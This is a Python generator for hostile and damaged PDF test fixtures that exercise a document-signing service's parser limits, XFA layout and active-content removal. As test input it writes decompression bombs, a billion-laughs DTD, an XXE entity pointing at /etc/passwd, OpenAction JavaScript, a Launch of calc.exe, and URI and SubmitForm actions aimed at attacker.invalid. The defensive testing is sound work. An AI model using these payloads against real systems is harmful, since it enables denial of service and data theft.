#!/usr/bin/env python3
"""Generate the hostile and damaged PDF fixtures (`F-005`, docs/21, docs/07 §PDF input).

    python3 -I fixtures/tools/generate.py            # writes fixtures/hostile/*.pdf
    python3 -I fixtures/tools/generate.py --check    # manifest and docs/21 agree with this script
    python3 -I fixtures/tools/generate.py --ml       # writes only fixtures/hostile/ml/*.pdf
    python3 -I fixtures/tools/generate.py --docx     # writes only fixtures/hostile/docx/*

The `ml_*` files (`SEC-I02`, docs/33 §4) are for the modeld rasteriser, not the PDF reader:
they are valid PDFs whose pages are too large or draw too much to rasterise. They have their
own manifest, `fixtures/hostile/ml/manifest.tsv` (file, docs/21 §ML limit, code, note),
asserted by `server/casual-sign-modeld/tests/raster.rs`.

The `docx_*` files (`VS-06C`, docs/07 `SEC-P13`, docs/21 §DOCX conversion) are Word uploads for
the conversion daemon: a valid control and archives that cross one of its limits or carry
macros or external references. Their manifest is `fixtures/hostile/docx/manifest.tsv` (file,
docs/21 §DOCX conversion limit, code, note), asserted by
`server/casual-sign-convertd/tests/convert.rs`.

Standard library only; every file is synthetic and nothing is downloaded. The PDFs are
not committed (several are tens of megabytes, and zlib's bytes may differ between
versions); this script and `fixtures/hostile/manifest.tsv` are. Builders started from
`spikes/spk-01-pdf-reader/gen_fixtures.py` (ours, `SPK-01`).

The manifest gives, per file: the docs/21 limits it crosses, `; `-separated and spelt as docs/21 spells them (or
`control`, `recovery`, `active`),
the code the reader returns under `strict`, and what the default, recovering reader must
do (`refuse`, `open+report`, `open+remove`). `--check` fails when a manifest row names a
file this script does not write, when the script writes a file the manifest lacks, or
when a PDF limit in docs/21 with a code has no fixture and no stated reason.
"""
import hashlib
import pathlib
import re
import io
import struct
import sys
import zipfile
import zlib

ROOT = pathlib.Path(__file__).resolve().parents[2]
OUT = ROOT / "fixtures" / "hostile"
MANIFEST = OUT / "manifest.tsv"
LIMITS_DOC = ROOT / "docs" / "21-PARSER-LIMITS.md"
HEADER = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
MIB = 1 << 20
OUT_ML = OUT / "ml"
ML_MANIFEST = OUT_ML / "manifest.tsv"
OUT_DOCX = OUT / "docx"
DOCX_MANIFEST = OUT_DOCX / "manifest.tsv"
# The address the external-picture fixture links to; convertd's test listens there and
# asserts nothing connects.
DOCX_EXTERNAL_PORT = 47391

# docs/21 PDF limits that have no fixture file, and why.
NO_FIXTURE = {
    "Envelope total (one-call create, or one upload at a time to a draft)": "an envelope-level limit, tested by the server with several documents (Phase 2)",
    "Time budget": "a host-supplied predicate, tested by a test that cancels, not by a file",
    "Values per parsed object": "built in memory by casual-sign-pdf's allocation test (a 40 MB array)",
    "Content-stream operands": "unit tests of ContentLexer and the `content` fuzz target build the cases in memory",
    "Field options and appearance states": "a unit test builds a field with 1,001 options in memory",
    "Bulk send list (`POST /bulk-sends`, `UXW-04`): rows; values; rows sent per `…/send` call": "a request limit, not a file: server/casual-sign-server/tests/bulk_send.rs builds 1,001 rows in memory",
    "Document metadata (`/Metadata`) checked as XMP (`NORM-03`)": "casual-sign-pdf's normalize_metadata tests build each over-limit and refused packet in memory (size, depth, attributes, DOCTYPE)",
}


def stream_obj(dict_body, data):
    return b"<<" + dict_body + b"/Length %d>>\nstream\n" % len(data) + data + b"\nendstream"


def classic(objs, trailer_extra=b""):
    """A file with a classic xref table. objs: [(number, body)]. Returns (bytes, xref offset)."""
    out = bytearray(HEADER)
    offs = {}
    for num, body in objs:
        offs[num] = len(out)
        out += b"%d 0 obj\n" % num + body + b"\nendobj\n"
    size = max(offs) + 1
    xref_pos = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % size
    for n in range(1, size):
        out += (b"%010d 00000 n \n" % offs[n]) if n in offs else b"0000000000 65535 f \n"
    out += b"trailer\n<</Size %d/Root 1 0 R%s>>\nstartxref\n%d\n%%%%EOF\n" % (size, trailer_extra, xref_pos)
    return bytes(out), xref_pos


def xref_stream_file(objs, compressed=None, size_override=None, index_override=None):
    """A file with an xref stream (W [1 4 2]). compressed: {number: (object stream, index)}."""
    compressed = compressed or {}
    out = bytearray(HEADER)
    offs = {}
    for num, body in objs:
        offs[num] = len(out)
        out += b"%d 0 obj\n" % num + body + b"\nendobj\n"
    xref_num = max(list(offs) + list(compressed)) + 1
    offs[xref_num] = len(out)
    size = xref_num + 1
    rows = bytearray()
    for n in range(size):
        if n in compressed:
            stm, idx = compressed[n]
            rows += bytes([2]) + stm.to_bytes(4, "big") + idx.to_bytes(2, "big")
        elif n in offs:
            rows += bytes([1]) + offs[n].to_bytes(4, "big") + (0).to_bytes(2, "big")
        else:
            rows += bytes([0]) + (0).to_bytes(4, "big") + (65535).to_bytes(2, "big")
    size_txt = size_override or b"%d" % size
    index = index_override or b"[0 %d]" % size
    d = b"/Type/XRef/Size %s/Index%s/W[1 4 2]/Root 1 0 R/Filter/FlateDecode" % (size_txt, index)
    out += b"%d 0 obj\n" % xref_num + stream_obj(d, zlib.compress(bytes(rows))) + b"\nendobj\n"
    out += b"startxref\n%d\n%%%%EOF\n" % offs[xref_num]
    return bytes(out)


def pages_objs(n_pages=1, first=3):
    """Catalog (1), Pages (2), and n pages with a small Flate content stream each."""
    kids = b" ".join(b"%d 0 R" % (first + 2 * i) for i in range(n_pages))
    objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[%s]/Count %d>>" % (kids, n_pages))]
    for i in range(n_pages):
        content = zlib.compress(b"BT /F1 12 Tf 72 720 Td (Page %d) Tj ET" % (i + 1))
        objs.append((first + 2 * i, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents %d 0 R>>" % (first + 1 + 2 * i)))
        objs.append((first + 1 + 2 * i, stream_obj(b"/Filter/FlateDecode", content)))
    return objs


def zeros_deflate(prefix, n_zero):
    c = zlib.compressobj(9)
    parts = [c.compress(prefix)]
    chunk = b"\0" * MIB
    left = n_zero
    while left > 0:
        take = min(left, MIB)
        parts.append(c.compress(chunk[:take]))
        left -= take
    parts.append(c.flush())
    return b"".join(parts)


# Encryption for the fixtures (PDF-ENC-01): the standard security handler, revision 3,
# RC4 128-bit (ISO 32000-2 §7.6.4), which the standard library can express. RC4 and the
# key derivation are written out here to build test input only.
PAD = bytes.fromhex("28BF4E5E4E758A4164004E56FFFA01082E2E00B6D0683E802F0CA9FE6453697A")
FILE_ID = b"openseal-fixture"
PERMS = -3904


def rc4(key, data):
    s = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s[i] + key[i % len(key)]) & 0xFF
        s[i], s[j] = s[j], s[i]
    out = bytearray(len(data))
    i = j = 0
    for k, byte in enumerate(data):
        i = (i + 1) & 0xFF
        j = (j + s[i]) & 0xFF
        s[i], s[j] = s[j], s[i]
        out[k] = byte ^ s[(s[i] + s[j]) & 0xFF]
    return bytes(out)


def md5(*parts):
    h = hashlib.md5()
    for x in parts:
        h.update(x)
    return h.digest()


def r3_encryption(user, owner):
    """(/Encrypt dictionary body, file key) for RC4-128, revision 3."""
    pad = lambda pw: (pw + PAD)[:32]
    ok = md5(pad(owner))
    for _ in range(50):
        ok = md5(ok)
    o = rc4(ok, pad(user))
    for i in range(1, 20):
        o = rc4(bytes(b ^ i for b in ok), o)
    key = md5(pad(user), o, PERMS.to_bytes(4, "little", signed=True), FILE_ID)
    for _ in range(50):
        key = md5(key)
    x = rc4(key, md5(PAD, FILE_ID))
    for i in range(1, 20):
        x = rc4(bytes(b ^ i for b in key), x)
    u = x + b"\0" * 16
    body = b"<</Filter/Standard/V 2/R 3/Length 128/P %d/O<%s>/U<%s>>>" % (
        PERMS, o.hex().encode(), u.hex().encode())
    return body, key


def encrypted_file(objs, user=b"", owner=b"openseal-owner", enc_body=None):
    """A classic file whose streams are RC4-encrypted (strings are left out of these
    fixtures); the /Encrypt dictionary is object 99."""
    body, key = r3_encryption(user, owner)
    out = []
    for num, obj in objs:
        k = md5(key, num.to_bytes(4, "little")[:3], b"\0\0")[:16]
        if b"stream\n" in obj:
            head, _, rest = obj.partition(b"stream\n")
            data, _, tail = rest.rpartition(b"\nendstream")
            obj = head + b"stream\n" + rc4(k, data) + b"\nendstream" + tail
        out.append((num, obj))
    out.append((99, enc_body if enc_body is not None else body))
    ident = FILE_ID.hex().encode()
    return classic(out, b"/Encrypt 99 0 R/ID[<%s><%s>]" % (ident, ident))[0]


def lzw_zero_bomb(n_zero):
    """LZW (EarlyChange 1) codes for n_zero zero bytes: 0, then 258, 259, ... each one
    zero longer, a clear code before the table fills."""
    out = bytearray()
    acc = nbits = 0
    width = 9

    def put(code):
        nonlocal acc, nbits
        acc = (acc << width) | code
        nbits += width
        while nbits >= 8:
            nbits -= 8
            out.append((acc >> nbits) & 0xFF)
            acc &= (1 << nbits) - 1

    left = n_zero
    while left > 0:
        put(256)  # at the width in force; the decoder then starts again at 9 bits
        width = 9
        put(0)
        left -= 1
        dec_next = 258
        run = 2
        while left >= run and dec_next < 4094:
            put(dec_next)  # the KwKwK case: one zero longer than the last
            left -= run
            run += 1
            dec_next += 1
            if dec_next + 1 >= (1 << width) and width < 12:
                width += 1
        while left > 0 and dec_next < 4094:
            put(0)
            left -= 1
            dec_next += 1
            if dec_next + 1 >= (1 << width) and width < 12:
                width += 1
    put(257)
    if nbits:
        out.append((acc << (8 - nbits)) & 0xFF)
    return bytes(out)


def with_catalog_entry(entry):
    objs = pages_objs(1)
    objs[0] = (1, b"<</Type/Catalog/Pages 2 0 R" + entry + b">>")
    return objs


# Dynamic XFA forms (XFA-01): the reader refuses them (CS-PDF-0012, no static content);
# casual-sign-xfa lays their packets out, within the limits of docs/21 §XFA. Each fixture
# below crosses one of those limits; its code is in the manifest's note.
XFA_PAGESET = (b'<pageSet><pageArea name="P"><contentArea x="0.5in" y="0.5in" w="7.5in" h="10in"/>'
               b'<medium short="8.5in" long="11in"/></pageArea></pageSet>')


def xfa_xdp(template_body, data=b"<form1/>", before=b""):
    return (b'<?xml version="1.0" encoding="UTF-8"?>' + before +
            b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">'
            b'<subform name="form1" layout="tb">' + XFA_PAGESET + template_body + b'</subform></template>'
            b'<xfa:datasets xmlns:xfa="http://www.xfa.org/schema/xfa-data/1.0/"><xfa:data>' + data +
            b'</xfa:data></xfa:datasets></xdp:xdp>')


def dynamic_xfa(packets):
    """A dynamic-only XFA form: one placeholder page, /NeedsRendering, the packets in one
    Flate stream."""
    objs = pages_objs(1)
    objs[0] = (1, b"<</Type/Catalog/Pages 2 0 R/NeedsRendering true/AcroForm<</Fields[]/XFA 5 0 R>>>>")
    objs.append((5, stream_obj(b"/Filter/FlateDecode", zlib.compress(packets, 9))))
    return classic(objs)[0]


def xfa_padding(n):
    """n bytes of XML comment that Flate compresses about 1:100, below the reader's
    1:1000 decode ratio, so the XFA size limit is what refuses them."""
    out = bytearray()
    x = 12345
    while len(out) < n:
        x = (x * 1103515245 + 12345) & 0x7FFFFFFF
        out += b"a" * 400 + bytes([97 + x % 26])
    return b"<!--" + bytes(out[:n]) + b"-->"


def builders():
    """name -> function returning the file's bytes. Order is the manifest's order."""
    b = {}
    valid, xref_pos = classic(pages_objs(3))

    # Controls: these must open cleanly.
    b["valid.pdf"] = lambda: valid
    b["valid_xrefstream.pdf"] = lambda: xref_stream_file(pages_objs(3))

    # File size: a valid file padded with a comment to 50 MiB + 1 byte.
    def too_large():
        # The comment adds `%`, the padding and `\n`: 2 bytes besides the padding.
        pad = 50 * MIB + 1 - len(valid) - 2
        return valid[: len(HEADER)] + b"%" + b"x" * pad + b"\n" + valid[len(HEADER):]
    b["too_large.pdf"] = too_large

    # Indirect objects: 1,000,001, all reachable, packed into object streams behind an xref
    # stream so the file stays under the 50 MiB size cap and the object cap is what refuses it.
    def many_objects():
        n = 1_000_001
        first, per = 10, 1000
        arr = first + n
        stm_base = arr + 1
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R/Many %d 0 R>>" % arr),
                (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>"),
                (arr, b"[" + b" ".join(b"%d 0 R" % i for i in range(first, first + n)) + b"]")]
        compressed = {}
        for k, start in enumerate(range(first, first + n, per)):
            nums = list(range(start, min(start + per, first + n)))
            bodies = [b"%d" % i for i in nums]
            offs, pos = [], 0
            for body in bodies:
                offs.append(pos)
                pos += len(body) + 1
            hdr = b" ".join(b"%d %d" % (num, off) for num, off in zip(nums, offs)) + b" "
            data = zlib.compress(hdr + b" ".join(bodies), 9)
            objs.append((stm_base + k, stream_obj(b"/Type/ObjStm/N %d/First %d/Filter/FlateDecode" % (len(nums), len(hdr)), data)))
            for idx, num in enumerate(nums):
                compressed[num] = (stm_base + k, idx)
        return xref_stream_file(objs, compressed=compressed)
    b["many_objects.pdf"] = many_objects

    # /Size far beyond anything present, in a table and in a stream.
    b["xref_size_2g_table.pdf"] = lambda: valid.replace(b"/Size 9/", b"/Size 2147483648/", 1)
    b["xref_size_2g_stream.pdf"] = lambda: xref_stream_file(pages_objs(1), size_override=b"2147483648",
                                                            index_override=b"[0 2147483648]")

    # Revisions: 1,001 incremental updates, each rewriting the catalog.
    def revisions_1001():
        body, xp = classic(pages_objs(1))
        out = bytearray(body)
        prev = xp
        for k in range(1001):
            pos = len(out)
            out += b"1 0 obj\n<</Type/Catalog/Pages 2 0 R/Rev %d>>\nendobj\n" % k
            xr = len(out)
            out += b"xref\n1 1\n%010d 00000 n \ntrailer\n<</Size 5/Root 1 0 R/Prev %d>>\nstartxref\n%d\n%%%%EOF\n" % (pos, prev, xr)
            prev = xr
        return bytes(out)
    b["revisions_1001.pdf"] = revisions_1001

    # /Prev loops.
    def prev_loops():
        body, xp1 = classic(pages_objs(1), trailer_extra=b"/Prev 0000000000")
        upd = bytearray(body)
        pos = len(upd)
        upd += b"1 0 obj\n<</Type/Catalog/Pages 2 0 R/Updated true>>\nendobj\n"
        ux = len(upd)
        upd += b"xref\n1 1\n%010d 00000 n \ntrailer\n<</Size 5/Root 1 0 R/Prev %d>>\nstartxref\n%d\n%%%%EOF\n" % (pos, xp1, ux)
        loop = bytes(upd).replace(b"/Prev 0000000000", b"/Prev %010d" % ux, 1)
        selfloop = body.replace(b"/Prev 0000000000", b"/Prev %010d" % xp1, 1)
        return loop, selfloop
    b["prev_loop.pdf"] = lambda: prev_loops()[0]
    b["prev_self_loop.pdf"] = lambda: prev_loops()[1]

    # Nesting: 257 (one over the limit) and 10^5, arrays and dictionaries.
    b["nesting_257_arrays.pdf"] = lambda: classic(with_catalog_entry(b"/Deep " + b"[" * 257 + b"]" * 257))[0]
    b["nesting_100k_arrays.pdf"] = lambda: classic(with_catalog_entry(b"/Deep " + b"[" * 100_000 + b"]" * 100_000))[0]
    b["nesting_100k_dicts.pdf"] = lambda: classic(with_catalog_entry(b"/Deep " + b"<</A " * 100_000 + b"1" + b">>" * 100_000))[0]

    # Reference resolution depth: a chain of 65 indirect references, 10 -> 11 -> ... -> 75.
    def ref_chain_65():
        objs = with_catalog_entry(b"/Chain 10 0 R")
        objs += [(10 + i, b"%d 0 R" % (11 + i)) for i in range(65)] + [(75, b"(end)")]
        return classic(objs)[0]
    b["ref_chain_65.pdf"] = ref_chain_65

    # Single stream over 256 MiB decoded (1 GiB of zeros), in content and in an object stream.
    def flate_bomb_content():
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter/FlateDecode", zeros_deflate(b"", 1 << 30)))
        return classic(objs)[0]
    b["flate_bomb_content.pdf"] = flate_bomb_content

    def flate_bomb_objstm():
        hdr = b"3 0 "
        data = zeros_deflate(hdr + b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>", 1 << 30)
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                (5, stream_obj(b"/Type/ObjStm/N 1/First %d/Filter/FlateDecode" % len(hdr), data))]
        return xref_stream_file(objs, compressed={3: (5, 0)})
    b["flate_bomb_objstm.pdf"] = flate_bomb_objstm

    # Total decoded over 1 GiB: eight object streams of 250 MiB, each under the per-stream cap
    # and each compressing well under 1000:1 (a 16 KiB pseudo-random block repeated: Deflate
    # finds the repeats but cannot reach the ratio cap), so the per-document budget is what
    # stops it, not the ratio (found by T-1A).
    def flate_bomb_many():
        block = bytes((i * 2654435761 >> 13) & 0xFF for i in range(16 * 1024))
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>")]
        compressed = {}
        reps = 250 * MIB // len(block)
        for k in range(8):
            hdr = b"%d 0 " % (10 + k)
            c = zlib.compressobj(9)
            parts = [c.compress(hdr + b"null ")]
            parts += [c.compress(block) for _ in range(reps)]
            parts.append(c.flush())
            objs.append((20 + k, stream_obj(b"/Type/ObjStm/N 1/First %d/Filter/FlateDecode" % len(hdr), b"".join(parts))))
            compressed[10 + k] = (20 + k, 0)
        return xref_stream_file(objs, compressed=compressed)
    b["flate_bomb_many.pdf"] = flate_bomb_many

    # Ratio: Flate applied twice, so 64 MiB of zeros fits in a few hundred bytes.
    def flate_double():
        once = zeros_deflate(b"", 64 * MIB)
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter[/FlateDecode/FlateDecode]", zlib.compress(once, 9)))
        return classic(objs)[0]
    b["flate_double.pdf"] = flate_double

    # Filter chain of 9.
    def filter_chain_9():
        data = b"BT ET"
        for _ in range(9):
            data = data.hex().encode() + b">"
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter[" + b"/ASCIIHexDecode" * 9 + b"]", data))
        return classic(objs)[0]
    b["filter_chain_9.pdf"] = filter_chain_9

    # Pages: 5,001; and a page-tree cycle.
    def pages_5001():
        n = 5001
        kids = b" ".join(b"%d 0 R" % (3 + i) for i in range(n))
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[%s]/Count %d>>" % (kids, n))]
        objs += [(3 + i, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>") for i in range(n)]
        return classic(objs)[0]
    b["pages_5001.pdf"] = pages_5001
    b["page_tree_cycle.pdf"] = lambda: classic([
        (1, b"<</Type/Catalog/Pages 2 0 R>>"),
        (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
        (3, b"<</Type/Pages/Parent 2 0 R/Kids[2 0 R 4 0 R]/Count 1>>"),
        (4, b"<</Type/Page/Parent 3 0 R/MediaBox[0 0 612 792]>>")])[0]

    # String over 16 MiB; name of 128 bytes.
    b["string_16mib_plus.pdf"] = lambda: classic(with_catalog_entry(b"/S (" + b"a" * (16 * MIB + 1) + b")"))[0]
    b["name_128.pdf"] = lambda: classic(with_catalog_entry(b"/" + b"N" * 128 + b" 1"))[0]

    # Text extraction: 2,000,001 operators in one page's content.
    def content_ops():
        ops = b"BT " + b"(a) Tj " * 2_000_001 + b"ET"
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter/FlateDecode", zlib.compress(ops, 9)))
        return classic(objs)[0]
    b["content_ops_2m.pdf"] = content_ops

    # Damage the recovering reader repairs.
    b["truncated.pdf"] = lambda: valid[: len(valid) * 6 // 10]

    def broken_offsets():
        head, _, tail = valid.partition(b"xref\n")
        fixed = []
        for ln in tail.split(b"\n"):
            if len(ln) == 19 and ln.endswith(b" n "):
                ln = b"%010d" % (int(ln[:10]) + 5) + ln[10:]
            fixed.append(ln)
        return head + b"xref\n" + b"\n".join(fixed)
    b["broken_xref_offsets.pdf"] = broken_offsets
    b["broken_startxref.pdf"] = lambda: valid.replace(b"startxref\n%d" % xref_pos, b"startxref\n%d" % (xref_pos - 40), 1)

    def objstm_self():
        inner = b"<</Type/Pages/Kids[3 0 R]/Count 1>>"
        hdr = b"2 0 5 %d " % len(inner)
        payload = zlib.compress(hdr + inner + b"<</Type/ObjStm>>")
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"),
                (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>"),
                (5, stream_obj(b"/Type/ObjStm/N 2/First %d/Extends 5 0 R/Filter/FlateDecode" % len(hdr), payload))]
        return xref_stream_file(objs, compressed={2: (5, 0), 5: (5, 1)})
    b["objstm_self.pdf"] = objstm_self

    # Active content the normalizer removes (docs/30 §3, SEC-P06 to SEC-P08).
    b["active_openaction_js.pdf"] = lambda: classic(with_catalog_entry(
        b"/OpenAction<</S/JavaScript/JS(app.alert\\(1\\))>>"))[0]
    b["active_launch.pdf"] = lambda: classic(with_catalog_entry(
        b"/OpenAction<</S/Launch/F(calc.exe)>>"))[0]
    b["active_uri_on_open.pdf"] = lambda: classic(with_catalog_entry(
        b"/OpenAction<</S/URI/URI(https://attacker.invalid/track)>>"))[0]
    b["active_submitform.pdf"] = lambda: classic(with_catalog_entry(
        b"/AA<</WC<</S/SubmitForm/F<</FS/URL/F(https://attacker.invalid/)>>>>>>"))[0]

    def embedded_file():
        objs = with_catalog_entry(b"/Names<</EmbeddedFiles<</Names[(a.exe) 10 0 R]>>>>")
        objs += [(10, b"<</Type/Filespec/F(a.exe)/EF<</F 11 0 R>>>>"),
                 (11, stream_obj(b"/Type/EmbeddedFile", b"MZ not really an executable"))]
        return classic(objs)[0]
    b["active_embedded_file.pdf"] = embedded_file

    # An object stream claiming a billion members (/N): nothing may be sized from it.
    def objstm_n_huge():
        hdr = b"3 0 "
        data = zlib.compress(hdr + b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>")
        objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"), (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
                (5, stream_obj(b"/Type/ObjStm/N 1000000001/First %d/Filter/FlateDecode" % len(hdr), data))]
        return xref_stream_file(objs, compressed={3: (5, 0)})
    b["objstm_n_huge.pdf"] = objstm_n_huge

    # An xref stream whose /W asks for 20-byte offsets: rows are read within the stream, never trusted.
    def xref_w_huge():
        good = xref_stream_file(pages_objs(1))
        return good.replace(b"/W[1 4 2]", b"/W[1 20 2]", 1)
    b["xref_w_huge.pdf"] = xref_w_huge

    # A page tree whose /Count claims a million pages over one kid: the count is never used to allocate.
    b["pages_count_lies.pdf"] = lambda: classic([
        (1, b"<</Type/Catalog/Pages 2 0 R>>"),
        (2, b"<</Type/Pages/Kids[3 0 R]/Count 1000000>>"),
        (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]>>")])[0]

    # A Form XObject that draws itself (Do of its own name): a cycle for every content interpreter.
    def xobject_self_cycle():
        objs = pages_objs(1)
        objs[2] = (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</XObject<</X 10 0 R>>>>>>")
        objs[3] = (4, stream_obj(b"", b"/X Do"))
        objs.append((10, stream_obj(b"/Type/XObject/Subtype/Form/BBox[0 0 10 10]/Resources<</XObject<</X 10 0 R>>>>", b"/X Do")))
        return classic(objs)[0]
    b["xobject_self_cycle.pdf"] = xobject_self_cycle

    def with_page_entry(entry, extra):
        """One page whose dictionary gains `entry`, plus extra objects from 10."""
        objs = pages_objs(1)
        objs[2] = (3, b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R" + entry + b">>")
        return classic(objs + extra)[0]

    xdp = b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><template/></xdp:xdp>'
    b["active_xfa.pdf"] = lambda: classic(with_catalog_entry(b"/AcroForm<</Fields[]/XFA 10 0 R>>")
                                          + [(10, stream_obj(b"", xdp))])[0]
    b["active_richmedia.pdf"] = lambda: with_page_entry(b"/Annots[10 0 R]", [
        (10, b"<</Type/Annot/Subtype/RichMedia/Rect[0 0 100 100]/RichMediaContent<<>>>>")])
    b["active_3d.pdf"] = lambda: with_page_entry(b"/Annots[10 0 R]", [
        (10, b"<</Type/Annot/Subtype/3D/Rect[0 0 100 100]/3DD 11 0 R>>"),
        (11, stream_obj(b"/Type/3D/Subtype/U3D", b"not a real U3D stream"))])
    b["active_external_stream.pdf"] = lambda: with_page_entry(b"/Resources<</XObject<</X 10 0 R>>>>", [
        (10, b"<</Type/XObject/Subtype/Form/BBox[0 0 10 10]/Length 0/F(https://attacker.invalid/x)>>\nstream\n\nendstream")])
    b["active_gotor.pdf"] = lambda: with_page_entry(b"/Annots[10 0 R]", [
        (10, b"<</Type/Annot/Subtype/Link/Rect[0 0 10 10]/A<</S/GoToR/F(other.pdf)/D[0/Fit]>>>>")])
    b["active_gotoe.pdf"] = lambda: with_page_entry(b"/Annots[10 0 R]", [
        (10, b"<</Type/Annot/Subtype/Link/Rect[0 0 10 10]/A<</S/GoToE/T<</R/C/N(a.pdf)>>/D[0/Fit]>>>>")])
    b["active_importdata.pdf"] = lambda: with_page_entry(b"/AA<</O<</S/ImportData/F(data.fdf)>>>>", [])
    b["active_js_nametree.pdf"] = lambda: classic(with_catalog_entry(b"/Names<</JavaScript<</Names[(a) 10 0 R]>>>>")
                                                  + [(10, b"<</S/JavaScript/JS(app.alert\\(1\\))>>")])[0]

    # LZW (PDF-LZW-01) is bounded like Flate: 64 MiB of zeros from about 50 KB crosses
    # the decode ratio.
    def lzw_bomb():
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter/LZWDecode", lzw_zero_bomb(64 * MIB)))
        return classic(objs)[0]
    b["lzw_bomb.pdf"] = lzw_bomb

    # Encrypted input (PDF-ENC-01).
    b["encrypted_empty_password.pdf"] = lambda: encrypted_file(pages_objs(1))
    b["encrypted_wrong_password.pdf"] = lambda: encrypted_file(pages_objs(1), user=b"openseal-user")

    def encrypted_flate_bomb():
        objs = pages_objs(1)
        objs[3] = (4, stream_obj(b"/Filter/FlateDecode", zeros_deflate(b"", 1 << 30)))
        return encrypted_file(objs)
    b["encrypted_flate_bomb.pdf"] = encrypted_flate_bomb
    b["encrypted_malformed.pdf"] = lambda: encrypted_file(
        pages_objs(1), enc_body=b"<</Filter/Standard/V 2/R 3/Length 128/P -3904/U<00>>>")
    b["encrypted_unknown_handler.pdf"] = lambda: encrypted_file(
        pages_objs(1), enc_body=b"<</Filter/FOPN_foweb/V 1/R 2/O<00>/U<00>/P -4>>")


    # Dynamic XFA (XFA-01): a control that lays out, then one fixture per docs/21 §XFA
    # limit and for each refused XML construct.
    b["xfa_valid.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b'<field name="name" w="3in" h="0.3in"><ui><textEdit/></ui><caption reserve="1in"><value><text>Name</text></value></caption></field>'))
    b["xfa_too_large.pdf"] = lambda: dynamic_xfa(xfa_xdp(b"", before=xfa_padding(64 * MIB + 1)))
    b["xfa_depth_65.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b'<draw name="d"><value><exData contentType="text/html"><body>' + b"<span>" * 58 + b"x" + b"</span>" * 58
        + b"</body></exData></value></draw>"))
    b["xfa_nesting_33.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b'<subform layout="tb">' * 33 + b'<field name="f" w="1in" h="0.25in"/>' + b"</subform>" * 33))
    b["xfa_nodes_4m.pdf"] = lambda: dynamic_xfa(xfa_xdp(b"<draw/>" * 4_000_001))
    b["xfa_attributes_257.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b"<draw " + b" ".join(b'a%d="1"' % i for i in range(257)) + b"/>"))
    b["xfa_billion_laughs.pdf"] = lambda: dynamic_xfa(xfa_xdp(b"", before=(
        b'<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        b'<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>')))
    b["xfa_external_entity.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b'<draw name="d"><value><text>&xxe;</text></value></draw>',
        before=b'<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'))
    b["xfa_undefined_entity.pdf"] = lambda: dynamic_xfa(xfa_xdp(b'<draw name="d"><value><text>&xxe;</text></value></draw>'))
    b["xfa_unbalanced.pdf"] = lambda: dynamic_xfa(xfa_xdp(b"<subform><draw></subform></draw>"))
    b["xfa_no_template.pdf"] = lambda: dynamic_xfa(b'<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><config/></xdp:xdp>')
    b["xfa_instances_200k.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b'<subform name="r" layout="tb" w="1in"><occur min="200001" max="-1"/></subform>'))
    b["xfa_pages_2001.pdf"] = lambda: dynamic_xfa(xfa_xdp(
        b'<subform name="r" layout="tb" w="1in"><occur min="2001" max="-1"/><field name="f" w="1in" h="6in"/></subform>'))

    return b


def ml_page(content, resources=b"", media=b"[0 0 612 792]", extra=()):
    """One page with `content` (uncompressed) and `resources`, plus extra objects from 5 on."""
    objs = [(1, b"<</Type/Catalog/Pages 2 0 R>>"),
            (2, b"<</Type/Pages/Kids[3 0 R]/Count 1>>"),
            (3, b"<</Type/Page/Parent 2 0 R/MediaBox%s/Resources<<%s>>/Contents 4 0 R>>" % (media, resources)),
            (4, stream_obj(b"", content))]
    objs.extend(extra)
    return classic(objs)[0]


def ml_image(dict_body, data):
    """A page that draws one image XObject (object 5) over the whole page."""
    return ml_page(b"q 612 0 0 792 0 0 cm /Im0 Do Q", b"/XObject<</Im0 5 0 R>>",
                   extra=[(5, stream_obj(b"/Type/XObject/Subtype/Image" + dict_body, data))])


